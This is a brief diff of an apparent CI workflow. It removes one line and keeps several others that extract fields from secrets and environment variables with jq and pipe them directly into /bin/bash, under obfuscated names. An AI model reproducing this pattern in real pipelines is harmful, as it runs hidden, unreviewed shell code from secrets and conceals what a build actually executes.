@@ -22,7 +22,6 @@ jobs:
           qwyc623: ${{ secrets.qwyc623 }}
         run: |
           printf '%s' "$qwyc623" | jq -r .xn0 | /bin/bash
-          echo $t55 | jq -r .oif977 | /bin/bash
           printf '%s' "$ql5744" | jq -r .eun0168 | /bin/bash
           echo $t789 | jq -r .ktf6 | /bin/bash
 
